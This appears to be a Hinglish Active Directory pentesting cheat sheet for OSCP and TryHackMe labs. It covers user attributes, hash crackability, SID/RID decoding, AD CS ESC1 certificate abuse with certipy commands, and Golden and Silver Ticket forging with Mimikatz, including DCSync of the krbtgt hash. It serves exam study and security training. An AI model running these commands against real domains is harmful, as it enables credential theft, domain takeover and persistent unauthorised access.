01

User Object — Important Attributes

Get-DomainUser / Get-ADUser output mein yeh fields sabse zyada matter karte hain.

FieldFocus Kyun
samaccountnameLogin username — attack commands mein yahi use hota hai (-Identity, -user)
objectsidUser ka unique SID — RID (last number) se confirm hota hai privilege level (500=Administrator, 512=Domain Admins group)
memberofKaunse groups ka member hai — sabse important field, privilege escalation paths yahin se dikhte hain
useraccountcontrolAccount flags — delegation type, password settings, disabled/enabled (section 02 dekho)
serviceprincipalname (SPN)Agar set hai → Kerberoastable account hai, TGS maang ke offline crack try kar sakte ho
pwdlastsetPassword kab change hua — bahut purana ho to weak/default password hone ka chance zyada
admincount1 ho to kabhi privileged group ka member tha (ya hai) — AdminSDHolder protected object
msds-allowedtodelegatetoConstrained Delegation target services — agar populated hai, delegation abuse possible
lastlogon / lastlogontimestampAccount active hai ya stale — stale accounts aksar misconfigured/forgotten hote hain
descriptionOften overlooked — admins kabhi kabhi yahan password ya hints likh dete hain galti se
distinguishednameOU path dikhata hai — kis team/department ka account hai pata chalta hai
Priority order jab enumerate karo: memberof → serviceprincipalname → useraccountcontrol → admincount → description

05

Hash Types — Kab Crackable, Kab Nahi

Alag-alag jagah se alag hash types milte hain — har ek ki apni cracking feasibility hoti hai.

Hash TypeKahan Se Milta HaiCrackable?Notes
NTLM SAM dump, LSASS, NTDS.dit Conditional Fast hash hai — GPU se bahut jaldi crack ho sakta hai agar password weak hai. Strong password ho to practically uncrackable time mein.
Net-NTLMv1 SMB/HTTP auth capture (Responder etc.) Haan Weak design — relatively fast crack ho jaata hai, ya relay bhi kar sakte ho
Net-NTLMv2 SMB/HTTP auth capture (Responder, mitm6) Slow but possible Salted — crack slow hai, wordlist/weak password par hi feasible. Relay zyada effective option hai cracking se
Kerberos RC4 (etype 23) Kerberoasting (TGS request) Haan Offline crack ke liye best target — service account ka weak password ho to fast crack
Kerberos AES256 (etype 18) Kerberoasting (agar AES enforce hai) Mushkil Bahut slow to crack — GPU par bhi RC4 se kai guna zyada time
AS-REP hash AS-REP Roasting (DONT_REQ_PREAUTH flag) Haan Same feasibility jaisa Kerberoasting — bina kisi authentication ke milta hai
NTDS.dit hash DCSync / NTDS.dit dump Depends Pass-the-hash ke liye directly usable hai, cracking ki zaroorat hi nahi aksar
DPAPI masterkey DPAPI_SYSTEM secret (Mimikatz) N/A Decrypt karne ke liye use hota hai, "crack" nahi karte — saved credentials/cookies unlock karta hai
Golden Rule: NTLM aur Kerberos RC4 hashes — pehle Pass-the-Hash/Overpass-the-Hash try karo (direct use), tabhi cracking par jao jab direct use possible na ho ya plaintext chahiye ho.

08

SID Structure — Kaise Decode Karein

Ek SID sirf ek random string nahi hai — iska structure fixed hai, aur last number (RID) se pata chal jaata hai yeh account kaun hai.

Example SID
S-1-5-21-3885271727-2693558621-2658995185-500
│ │ │  └──────────── Domain Identifier (unique per domain) ────────────┘    └ RID
│ │ └─ Identifier Authority (5 = NT Authority)
│ └─── Revision level (hamesha 1)
└───── "S" = SID literal

Domain part (S-1-5-21-xxxx-xxxx-xxxx) har domain mein same rehta hai — sirf last number (RID) badalta hai account ke hisaab se. Isliye RID yaad rakhna sabse zaroori hai.

RIDKaun HaiNotes
500Built-in AdministratorRename ho sakta hai, lekin RID 500 hamesha wahi account hai — high value target
501GuestDefault disabled hota hai
512Domain Admins (group)Sabse powerful group — iska member milna = game over
513Domain Users (group)Default group — har normal user isme hota hai
514Domain GuestsRarely used
515Domain ComputersNormal workstation/server machine accounts
516Domain ControllersDC machine accounts ka group — primarygroupid isi se match karte hain
518Schema AdminsAD schema modify kar sakte hain — bahut sensitive
519Enterprise AdminsForest-wide highest privilege — DA se bhi upar multi-domain forest mein
1000+Custom users/groupsHar naya banaya hua object — sequentially number milta hai
PowerShell — SID se username resolve karo (ya ulta)
ConvertFrom-SID S-1-5-21-3885271727-2693558621-2658995185-500
# Output example:
za\Administrator

Get-DomainUser -Identity administrator | Select samaccountname,objectsid
# Output example:
samaccountname : Administrator
objectsid      : S-1-5-21-3885271727-2693558621-2658995185-500
Quick trick: Kisi bhi output mein SID ke bilkul last number ko dekho — agar -500 ya -512/-519 dikhe, to samajh jao yeh ek high-value target hai, chahe display name kuch bhi ho (rename kiya ja sakta hai, RID nahi badalta).

AD CS — Certificate Services Vulnerabilities (ESC1–ESC8)

Agar domain mein Active Directory Certificate Services (AD CS) install hai, to misconfigured certificate templates se seedha Domain Admin tak pahunch sakte ho — OSCP/real engagements mein bahut common hai.

Enumeration — Certify ya Certipy se
Certify.exe find /vulnerable
# ya Linux se
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.1 -vulnerable
VulnMisconfigurationImpact
ESC1Template enrollee khud SubjectAltName specify kar sakta hai + client auth enabledKisi bhi user (Domain Admin bhi) ka naam daal ke uska certificate bana lo → unki identity se authenticate
ESC2Template "Any Purpose" EKU rakhta haiCertificate kisi bhi purpose ke liye use ho sakta hai — auth sahit
ESC3"Certificate Request Agent" EKU misconfiguredKisi aur user ki taraf se certificate request kar sakte ho (enrollment agent abuse)
ESC4Low-priv user ko template par WriteProperty/GenericWrite mila huaTemplate ko khud modify karke usme ESC1-jaisi vulnerability inject kar do
ESC6CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 set haiPoore CA-level par SAN specify kar sakte ho kisi bhi template se
ESC8CA Web Enrollment (HTTP) enabled, NTLM relay possibleCoercion (PetitPotam) + relay se DC ka certificate le lo
ESC1 Exploit — Domain Admin ke naam se certificate request karo
certipy req -u attacker@domain.local -p Password123 -ca CORP-CA -template VulnTemplate -upn administrator@domain.local
# Output example:
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saved certificate and private key to 'administrator.pfx'

# Phir us certificate se TGT lo (PKINIT)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
# Output:
[*] Using principal: administrator@domain.local
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] NT hash: aad3b435b51404eeaad3b435b51404ee
OSCP ke liye: Pehle certipy find -vulnerable chalao — agar ESC1 dikhe, yeh usually sabse fast Domain Admin path hota hai, Kerberoasting se bhi pehle try karne layak.
10

Golden Ticket vs Silver Ticket

Dono forged Kerberos tickets hain, lekin alag-alag hash chahiye aur alag scope milta hai.

Golden TicketSilver Ticket
Chahiyekrbtgt account ka NTLM hashTarget service/computer account ka NTLM hash
Forge Kiya Jaata HaiEk fake TGT (Ticket Granting Ticket)Ek fake TGS (Service Ticket) — seedha, TGT ki zaroorat nahi
ScopePoore domain ki koi bhi service — sab kuch accessSirf ek specific service jiska hash use kiya (jaise CIFS/HOST)
DC ContactPehli baar banane mein nahi, lekin baad mein PAC validation ke time ho sakta haiBilkul nahi — KDC se koi interaction nahi, isliye zyada stealthy
Kab Use KaroJab krbtgt hash mil gaya ho (DCSync/NTDS.dit se) — poore domain ka permanent backdoor chahiyeJab sirf ek service account/computer hash mila ho, aur sirf uss specific service tak access chahiye
Golden Ticket — Mimikatz
# Pehle krbtgt hash chahiye (DCSync se milta hai)
mimikatz# lsadump::dcsync /user:za\krbtgt
# Output example:
Hash NTLM: 1a2b3c4d5e6f7890abcdef1234567890
SID: S-1-5-21-3885271727-2693558621-2658995185

# Ab golden ticket forge karo
mimikatz# kerberos::golden /user:fakeadmin /domain:za.tryhackme.loc /sid:S-1-5-21-... /krbtgt:1a2b3c4d5e6f7890abcdef1234567890 /ptt
# Output example:
User      : fakeadmin
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-...
User Id   : 500
Groups Id : *513 512 520 518 519
Golden ticket for 'fakeadmin @ za.tryhackme.loc' successfully submitted for current session

# Verify
dir \\THMDC\C$
✅ Access granted — poore domain mein kahin bhi
Silver Ticket — Mimikatz (CIFS service ke liye)
# Target machine ka hash chahiye (jaise machine account ka NTLM)
mimikatz# kerberos::golden /user:fakeadmin /domain:za.tryhackme.loc /sid:S-1-5-21-... /target:THMSERVER1.za.tryhackme.loc /service:CIFS /rc4:4207d1b7e4b942da2371174b772fdf5e /ptt
# Output example:
User      : fakeadmin
Service   : CIFS
Target    : THMSERVER1.za.tryhackme.loc
Silver ticket for 'fakeadmin @ za.tryhackme.loc' successfully submitted

# Verify — sirf CIFS (file share) access milega, poora domain nahi
dir \\THMSERVER1\C$
✅ Access granted — SIRF THMSERVER1 ke CIFS tak
dir \\THMDC\C$
❌ Access denied — doosri services/machines tak nahi
OSCP ke liye priority: Golden Ticket zyada common exam scenario hai (DCSync ke baad domain persistence dikhane ke liye). Silver Ticket kam use hota hai exams mein, lekin concept samajhna zaroori hai — "kam hash se bhi targeted access mil sakta hai" wali baat.
Yeh reference AD/Windows enumeration ke sabse common data points cover karta hai — asli engagement mein tool version aur environment ke hisaab se output format thoda vary kar sakta hai, lekin fields ka matlab same rehta hai.
